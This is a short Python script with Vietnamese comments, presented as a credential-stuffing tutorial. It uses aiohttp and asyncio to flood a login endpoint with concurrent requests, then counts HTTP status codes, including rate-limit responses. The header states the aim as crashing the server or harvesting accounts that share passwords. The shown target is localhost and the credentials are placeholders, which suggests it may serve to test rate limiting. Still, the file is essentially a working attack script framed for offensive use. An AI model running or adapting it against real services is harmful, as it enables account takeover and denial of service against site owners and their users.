# HƯỚNG DẪN CREDENTIAL STUFFING BẰNG AIOHTTP[cite: 58, 59]:
# Workflow: Đọc list 10k tài khoản -> asyncio.gather() để bắn 100 request/giây vào endpoint /login.
# Mục đích: Đánh sập Server hoặc thu hoạch các account dùng chung mật khẩu.

import asyncio
import aiohttp
import time

URL = "http://127.0.0.1:8000/api/auth/login"
TOTAL_REQUESTS = 200  # Số lượng request muốn bắn

async def fetch(session, username, password):
    payload = {"username": username, "password": password}
    # Gửi request không chờ đợi (Bắn dồn dập)
    async with session.post(URL, json=payload) as response:
        return response.status

async def main():
    print("🚀 BẮT ĐẦU CHIẾN DỊCH CREDENTIAL STUFFING 🚀")
    print(f"Mục tiêu: {URL}\n")
    
    tasks = []
    # connector=aiohttp.TCPConnector(limit=100) giúp bắn 100 request đồng thời
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=100)) as session:
        # Tạo danh sách tài khoản giả mạo
        for i in range(TOTAL_REQUESTS):
            tasks.append(fetch(session, f"hacker_{i}", f"pass_{i}"))
            
        start_time = time.time()
        # Kích hoạt bắn tất cả cùng lúc
        results = await asyncio.gather(*tasks)
        end_time = time.time()
        
    # Thống kê kết quả
    status_counts = {}
    for status in results:
        status_counts[status] = status_counts.get(status, 0) + 1
        
    print(f"⏱️ Tổng thời gian chạy {TOTAL_REQUESTS} requests: {end_time - start_time:.2f} giây")
    print("\n📊 THỐNG KÊ MÃ PHẢN HỒI HTTP:")
    for status, count in status_counts.items():
        if status == 429:
            print(f"  ❌ Lỗi {status} (Bị chặn bởi Rate Limit): {count} requests")
        elif status == 404 or status == 401:
            print(f"  ✅ Code {status} (Server đã xử lý xong): {count} requests")
        else:
            print(f"  - Code {status}: {count} requests")

if __name__ == "__main__":
    # Để chạy được trên Windows/Linux không bị lỗi Event Loop
    import sys
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())